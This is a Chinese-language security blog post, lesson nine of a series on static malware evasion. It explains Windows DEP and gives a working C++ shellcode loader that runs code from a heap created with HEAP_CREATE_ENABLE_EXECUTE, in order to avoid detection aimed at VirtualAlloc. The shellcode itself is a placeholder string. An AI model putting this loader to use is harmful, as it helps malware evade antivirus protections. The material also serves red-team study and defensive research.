<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>静态恶意代码逃逸（第九课） - 倾旋的博客</title><meta name=theme-color><meta name=description content='代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
0x01 数据执行保护（DEP）
DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 微软从Windows XP SP2引入了该技术，并一直延续到今天。
为什么要有DEP
在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限制某些内存页不具有可执行权限。
0x02 如何绕过DEP
VirtualProtect这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为VirtualProtect的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从"不可执行"变成"可执行"。
0x03 举一反三
由此说来，Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？
HeapCreate可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：
HANDLE WINAPI HeapCreate(
__in DWORD flOptions,
__in SIZE_T dwInitialSize,
__in SIZE_T dwMaximumSize );
第一个参数flOptions用于修改如何在堆栈上执行各种操作。
你可以设定0、HEAP_NO_SERIALIZE、HEAP_GENERATE_EXCEPTIONS、HEAP_CREATE_ENABLE_EXECUTE或者是这些标志的组合。

HEAP_NO_SERIALIZE：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。
HEAP_GENERATE_EXCEPTIONS：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。
HEAP_CREATE_ENALBE_EXECUTE：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。

看到HEAP_CREATE_ENALBE_EXECUTE相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。
0x04 Shellcode执行
#include <iostream>
#include <Windows.h>

int main()
{
	char shellcode[] = "123";

	HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);

	PVOID Mptr = HeapAlloc(hHep, 0, sizeof(shellcode));

	RtlCopyMemory(Mptr, shellcode, sizeof(shellcode));
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, NULL, &amp;dwThreadId);
	WaitForSingleObject(hThread, INFINITE);

    std::cout << "Hello World!\n";
}
上方的例子中，我将shellcode替换为了其他字符串，因为我觉得shellcode混淆是另外一回事。'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="静态恶意代码逃逸（第九课）"><meta itemprop=description content="本节课，使用HeapCreate API来关闭DEP保护，获取在堆上的代码执行权限，从而绕过对VirtualAlloc的检测。"><meta itemprop=datePublished content="2020-11-29T00:00:00+00:00"><meta itemprop=dateModified content="2020-11-29T00:00:00+00:00"><meta itemprop=wordCount content="95"><meta property="og:url" content="https://payloads.online/archivers/2020-11-29/2/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="静态恶意代码逃逸（第九课）"><meta property="og:description" content="本节课，使用HeapCreate API来关闭DEP保护，获取在堆上的代码执行权限，从而绕过对VirtualAlloc的检测。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-29T00:00:00+00:00"><meta property="article:modified_time" content="2020-11-29T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="静态恶意代码逃逸（第九课）"><meta name=twitter:description content="本节课，使用HeapCreate API来关闭DEP保护，获取在堆上的代码执行权限，从而绕过对VirtualAlloc的检测。"><link rel=canonical href=https://payloads.online/archivers/2020-11-29/2/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">静态恶意代码逃逸（第九课）</h1><div class="text-xs antialiased opacity-60"><time>Nov 29, 2020</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><p>代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><h2 id=0x01-数据执行保护dep>0x01 数据执行保护（DEP）</h2><p>DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 微软从Windows XP SP2引入了该技术，并一直延续到今天。</p><h3 id=为什么要有dep>为什么要有DEP</h3><p>在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限制某些内存页不具有可执行权限。</p><h2 id=0x02-如何绕过dep>0x02 如何绕过DEP</h2><p><code>VirtualProtect</code>这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为<code>VirtualProtect</code>的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从"不可执行"变成"可执行"。</p><h2 id=0x03-举一反三>0x03 举一反三</h2><p>由此说来，Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？</p><p><code>HeapCreate</code>可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>HANDLE WINAPI <span style=color:#a6e22e>HeapCreate</span>(
</span></span><span style=display:flex><span>__in DWORD flOptions,
</span></span><span style=display:flex><span>__in SIZE_T dwInitialSize,
</span></span><span style=display:flex><span>__in SIZE_T dwMaximumSize );
</span></span></code></pre></div><p>第一个参数<code>flOptions</code>用于修改如何在堆栈上执行各种操作。
你可以设定<code>0</code>、<code>HEAP_NO_SERIALIZE</code>、<code>HEAP_GENERATE_EXCEPTIONS</code>、<code>HEAP_CREATE_ENABLE_EXECUTE</code>或者是这些标志的组合。</p><ul><li><code>HEAP_NO_SERIALIZE</code>：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。</li><li><code>HEAP_GENERATE_EXCEPTIONS</code>：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。</li><li><code>HEAP_CREATE_ENALBE_EXECUTE</code>：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。</li></ul><p>看到<code>HEAP_CREATE_ENALBE_EXECUTE</code>相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。</p><h2 id=0x04-shellcode执行>0x04 Shellcode执行</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> shellcode[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;123&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	HANDLE hHep <span style=color:#f92672>=</span> HeapCreate(HEAP_CREATE_ENABLE_EXECUTE <span style=color:#f92672>|</span> HEAP_ZERO_MEMORY, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	PVOID Mptr <span style=color:#f92672>=</span> HeapAlloc(hHep, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(shellcode));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	RtlCopyMemory(Mptr, shellcode, <span style=color:#66d9ef>sizeof</span>(shellcode));
</span></span><span style=display:flex><span>	DWORD dwThreadId <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	HANDLE hThread <span style=color:#f92672>=</span> CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, NULL, <span style=color:#f92672>&amp;</span>dwThreadId);
</span></span><span style=display:flex><span>	WaitForSingleObject(hThread, INFINITE);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Hello World!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>上方的例子中，我将shellcode替换为了其他字符串，因为我觉得shellcode混淆是另外一回事。</p><p><img src=https://images.payloads.online/a834c32c-4f5f-11ec-b9a7-00d861bf4abb.png alt=2020-11-29-17-41-52></p><blockquote><p>样本链接：https://www.virustotal.com/gui/file/1db88905be721e2b279f8f9a6dad1fbf945311b50cc79378d9f69cec5bbe2f6a/detection</p></blockquote></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2021-01-31/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>Windows权限控制相关的防御与攻击技术</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2020-11-29/1/><span>静态恶意代码逃逸（第八课）</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>